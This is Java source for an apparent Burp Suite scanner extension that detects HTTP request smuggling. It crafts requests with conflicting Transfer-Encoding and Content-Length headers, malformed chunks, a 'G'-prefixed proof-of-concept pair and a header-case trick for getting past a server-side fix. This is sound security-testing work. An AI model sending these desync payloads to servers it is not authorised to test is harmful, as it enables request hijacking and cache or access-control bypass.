package burp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.LinkedList;
import java.util.List;


class SmuggleHelper {

    private RequestEngine engine;
    private List<Resp> reqs = new LinkedList<>();
    private IHttpService service;
    private int id = 0;

    SmuggleHelper(IHttpService service) {
        this.service = service;
        String url = service.getProtocol()+"://"+service.getHost()+":"+service.getPort();
        this.engine = new ThreadedRequestEngine(url, 1, 10, 1, 10, this::callback, 10);
    }

    void queue(String req) {
        engine.queue(req); // , Integer.toString(id++)
    }

    private boolean callback(Request req, boolean interesting) {
        reqs.add(new Resp(new Req(req.getRawRequest(), req.getRawResponse(), service)));
        return false;
    }

    List<Resp> waitFor() {
        engine.start(10);
        engine.showStats(60);
        return reqs;
    }

    // todo move into turbo intruder?
}

public class SmuggleScan extends Scan implements IScannerCheck  {

    private Resp buildPoc(byte[] req, IHttpService service) {
        try {
            byte[] badMethodIfChunked = Utilities.setHeader(req, "Connection", "keep-alive");
            badMethodIfChunked = makeChunked(badMethodIfChunked, 1, 0);

            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            buf.write(badMethodIfChunked);
            buf.write("G".getBytes());

            // first request ends here
            buf.write(makeChunked(req, 0, 0));
            return new Resp(new Req(buf.toByteArray(), null, service));
        }
        catch (IOException e) {
            throw new RuntimeException();
        }
    }

    private void sendPoc(byte[] req, IHttpService service) {
        byte[] badMethodIfChunked = Utilities.setHeader(req, "Connection", "keep-alive");
        badMethodIfChunked = bypassContentLengthFix(makeChunked(badMethodIfChunked, 1, 0));
        SmuggleHelper helper = new SmuggleHelper(service);
        helper.queue(Utilities.helpers.bytesToString(badMethodIfChunked)+"G");
        helper.queue(Utilities.helpers.bytesToString(makeChunked(req, 0, 0)));
        List<Resp> results = helper.waitFor();
        if (results.get(0).getInfo().getStatusCode() != results.get(1).getInfo().getStatusCode()) {
            Utilities.out("Probably vulnerable blah");
            report("Req smuggling confirmed", "Status:timeout", results.get(0), results.get(1));
        }
    }

    byte[] bypassContentLengthFix(byte[] req) {
        return Utilities.replace(req, "Content-Length: ".getBytes(), "Content-length: ".getBytes());
    }

    private byte[] makeChunked(byte[] baseReq, int contentLengthOffset, int chunkOffset) {
        byte[] chunkedReq = Utilities.setHeader(baseReq, "Transfer-Encoding", "chunked");
        int bodySize = baseReq.length - Utilities.getBodyStart(baseReq);
        String body = Utilities.getBody(baseReq);
        int chunkSize = bodySize+chunkOffset;
        if (chunkSize > 0) {
            chunkedReq = Utilities.setBody(chunkedReq, Integer.toHexString(chunkSize) + "\r\n" + body + "\r\n0\r\n\r\n");
        }
        else {
            chunkedReq = Utilities.setBody(chunkedReq, "0\r\n\r\n");
        }
        bodySize = chunkedReq.length - Utilities.getBodyStart(chunkedReq);
        String newContentLength = Integer.toString(bodySize+contentLengthOffset);
        chunkedReq = Utilities.setHeader(chunkedReq, "Content-Length", newContentLength);
        return chunkedReq;
    }

    public List<IScanIssue> doScan(byte[] original, IHttpService service) {

        if (original[0] == 'G') {
            original = Utilities.helpers.toggleRequestMethod(original);
        }

        original = Utilities.addOrReplaceHeader(original, "Transfer-Encoding", "foo");
        original = Utilities.setHeader(original, "Connection", "close");
        sendPoc(original, service);

        byte[] baseReq = makeChunked(original, 0, 0);
        Resp syncedResp = request(service, baseReq);
        if (syncedResp.timedOut()) {
            Utilities.log("Timeout on first request. Aborting.");
            return null;
        }

        Resp suggestedProbe = buildPoc(original, service);

        byte[] reverseLength = makeChunked(original, -1, 0); //Utilities.setHeader(baseReq, "Content-Length", "4");
        Resp truncatedChunk = request(service, reverseLength);
        if (truncatedChunk.timedOut()) {
            Utilities.log("Reporting reverse timeout technique worked");
            report("Req smuggling v1-b", "Status:timeout", syncedResp, truncatedChunk, suggestedProbe);
            return null;
        }
        else {
            byte[] dualChunkTruncate = Utilities.addOrReplaceHeader(reverseLength, "Transfer-encoding", "cow");
            Resp truncatedDualChunk = request(service, dualChunkTruncate);
            if (truncatedDualChunk.timedOut()) {
                Utilities.log("Reverse timeout technique with dual TE header worked");
                report("Req smuggling v2", "Status:timeout", syncedResp, truncatedDualChunk, suggestedProbe);
                return null;
            }
        }


        byte[] badLength = makeChunked(original, 1, 0); //Utilities.setHeader(baseReq, "Content-Length", "6");
        Resp badLengthResp = request(service, badLength);
        if (!badLengthResp.timedOut() && badLengthResp.getInfo().getStatusCode() == syncedResp.getInfo().getStatusCode()) {
            Utilities.log("Overlong content length didn't cause a timeout or code-change. Aborting.");
            return null;
        }

        byte[] badChunk = Utilities.setBody(baseReq, "Z\r\n\r\n");
        badChunk = Utilities.setHeader(badChunk,"Content-Length", "5");
        Resp badChunkResp = request(service, badChunk);
        if (badChunkResp.timedOut()) {
            Utilities.log("Bad chunk attack timed out. Aborting.");
            return null;
        }

        if (badChunkResp.getInfo().getStatusCode() == syncedResp.getInfo().getStatusCode()) {
            Utilities.log("Invalid chunk probe caused a timeout. Attempting chunk timeout instead.");

            byte[] timeoutChunk = makeChunked(original, 0, 1); //Utilities.setBody(baseReq, "1\r\n\r\n");
            badChunkResp = request(service, timeoutChunk);
            short badChunkCode = badChunkResp.getInfo().getStatusCode();
            if (! (badChunkResp.timedOut() || (badChunkCode != badLengthResp.getInfo().getStatusCode() && badChunkCode != syncedResp.getInfo().getStatusCode()))) {
                Utilities.log("Bad chunk didn't affect status code and chunk timeout failed. Aborting.");
                return null;
            }
        }

        report("Req smuggling v1", "Status:BadChunkDetection:BadLengthDetected", syncedResp, badChunkResp, badLengthResp, suggestedProbe);
        return null;
    }
}

